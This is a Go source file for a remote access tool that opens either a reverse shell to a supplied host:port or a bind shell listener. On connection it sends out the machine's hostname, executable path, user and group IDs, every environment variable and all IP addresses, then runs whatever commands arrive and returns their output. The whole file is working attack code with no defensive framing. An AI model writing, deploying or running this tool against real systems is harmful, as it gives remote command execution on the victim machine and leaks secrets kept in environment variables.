package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	host := flag.String("h", "", "the host:ip to connect back to or bind to, e.g. 192.168.0.15:1337")
	udp := flag.Bool("udp", false, "use UDP instead of the default TCP")
	bind := flag.Bool("bind", false, "create a bind shell instead of the default reverse shell")

	flag.Parse()

	// set the protocol
	protocol := "tcp"
	if *udp {
		protocol = "udp"
	}

	executable, err := os.Executable()
	if err != nil {
		executable = "unknown"
	}

	// gather environment variables
	envs := "Environment Variables:\n"
	for _, env := range os.Environ() {
		envs = envs + "- " + env + "\n"
	}

	// gather system IP addresses
	ips := "IP Addresses:\n"
	for _, ip := range getIPs() {
		ips = ips + "- " + ip.String() + "\n"
	}

	// write system details to the connection
	details := fmt.Sprintf("Hostname: %s\nLocation: %s\nUID: %d\nGID: %d\n\n%s\n%s\n\n%s$ ", getHostname(), executable, os.Getuid(), os.Getgid(), envs, ips, getHostname())
	//fmt.Fprintf(conn, "Hostname: %s\nLocation: %s\nUID: %d\nGID: %d\n\n%s\n%s\n", hostname, executable, os.Getuid(), os.Getgid(), envs, ips)

	if *bind {
		bindShell(protocol, *host, details)
	} else {
		reverseShell(protocol, *host, details)
	}
}

func reverseShell(protocol string, host string, details string) {
	// connect to the host
	conn, err := net.Dial(protocol, host)

	if err != nil {
		log.Fatal("Connection failed.")
	}

	fmt.Fprintf(conn, details)

	for {

		message, _ := bufio.NewReader(conn).ReadString('\n')
		message = strings.TrimSuffix(message, "\n")
		splitMessage := strings.Fields(message)
		out, err := exec.Command(splitMessage[0], splitMessage[1:]...).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n%s$ ", out, getHostname())

	}
}

func bindShell(protocol string, host string, details string) {
	// setup listener for incoming connections
	listen, err := net.Listen(protocol, host)
	if err != nil {
		fmt.Println("Error: ", err.Error())
		os.Exit(1)
	}

	defer listen.Close()
	fmt.Println("Listening on", host)
	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("Error accepting Connection ", err.Error())
			os.Exit(1)
		}

		fmt.Fprintf(conn, details)

		// handle connection
		handleMultiBindRequest(conn, host)
	}
}

func handleMultiBindRequest(conn net.Conn, hostname string) {

	for {

		buffer := make([]byte, 1024)

		length, err := conn.Read(buffer)
		if err != nil {
			conn.Write([]byte("misunderstood instruction"))
		}

		command := string(buffer[:length-1])
		parts := strings.Fields(command)
		head := parts[0]
		parts = parts[1:len(parts)]

		// exit condition
		if head == "QUIT" {
			break
		}

		out, err := exec.Command(head, parts...).Output()
		if err != nil {
			conn.Write([]byte("Error during exec"))
		}

		fmt.Fprintf(conn, "%s\n%s$ ", string(out), getHostname())
	}

	conn.Close()
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = ""
	}
	return hostname
}

func getIPs() []net.IP {
	var ips []net.IP
	ifaces, _ := net.Interfaces()

	// handle err
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		// handle err
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ips = append(ips, ip)
		}
	}
	return ips
}
